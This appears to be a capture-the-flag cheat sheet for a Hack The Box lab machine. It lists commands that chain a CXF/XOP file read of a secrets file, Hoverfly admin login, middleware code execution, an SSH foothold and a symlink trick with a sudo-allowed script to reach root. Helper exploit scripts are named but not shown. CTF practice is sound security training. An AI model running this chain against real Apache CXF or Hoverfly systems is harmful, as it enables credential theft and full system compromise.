# DevArea HTB Cheat Sheet (One-Page Replay)

## Goal
Fast command replay for the proven chain.

## 0) Quick checks
```bash
date -u
pwd
```

## 1) SOAP fingerprint
```bash
curl -sS -i --max-time 8 http://devarea.htb:8080/employeeservice | sed -n '1,20p'
```
Expected: SOAP `500` + Jetty header.

## 2) Leak secrets via XOP read
```bash
python3 /home/ctf/ctf/xop_read.py file:///etc/syswatch.env --timeout 20 | sed -n '1,120p'
```
Expected keys:
- `SYSWATCH_SECRET_KEY`
- `SYSWATCH_ADMIN_PASSWORD`
- `SYSWATCH_LOG_DIR`

## 3) Validate Hoverfly admin
```bash
curl -sS -i -X POST http://devarea.htb:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<REDACTED>"}'
```
Expected: `200 OK` + token JSON.

## 4) Prove middleware execution
```bash
bash /home/ctf/ctf/proof_hoverfly.sh
```
Expected: middleware APIs `200`; marker `HOVERFLY_RCE_OK`.

## 5) Foothold + sudo surface
```bash
python3 /home/ctf/ctf/paramiko_proof.py
```
Expected:
- `uid=1001(dev_ryan)`
- `sudo -l` shows `/opt/syswatch/syswatch.sh` allowance.

## 6) Root chain
```bash
python3 /home/ctf/ctf/exploit_rootflag_symlink.py
```
Expected:
- `/opt/syswatch/logs/service.log -> x`
- root flag printed.

## Root flag (from proof)
```text
<ROOT_FLAG_REDACTED>
```

## CVE / advisory map
- CXF/XOP file-read class: CVE-2022-46364 context
- Hoverfly middleware auth RCE class: GHSA-r4h8-hfp2-ggmf / CVE-2024-45388 discussions

## Proof files
- `/home/ctf/ctf/proof_output_clean.txt`
- `/home/ctf/ctf/proof_hoverfly_output.txt`
- `/home/ctf/ctf/proof_paramiko_output.txt`
- `/home/ctf/ctf/proof_root_chain.txt`
